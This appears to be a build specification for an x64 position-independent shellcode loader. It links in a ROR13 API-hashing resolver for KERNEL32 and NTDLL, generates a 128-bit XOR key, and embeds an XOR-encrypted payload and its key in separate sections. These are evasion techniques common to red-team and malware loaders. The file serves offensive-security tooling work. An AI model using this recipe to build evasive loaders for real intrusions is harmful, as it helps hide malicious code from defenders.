x64:
	
	load "carokann.x64.o"
		make pic +gofirst

	# merge general services
    load "../../shared/resolve.x64.o"
        merge

    mergelib "../../libtcg/libtcg.x64.zip"

    dfr "resolve" "ror13" "KERNEL32, NTDLL"
    dfr "resolve_ext" "strings"

	# Generate a 128-bit XOR key for the payload
	generate $MASK 128

	# Encrypt and add payload to section 'payload'
    run "payload.spec"
		xor $MASK
		preplen
        link "payload"
		
#	load "shellcode.bin"
#		xor $MASK
#		preplen
#		link "payload"

	# Add XOR key to section 'mask'
	push $MASK
        preplen
        link "mask"

	export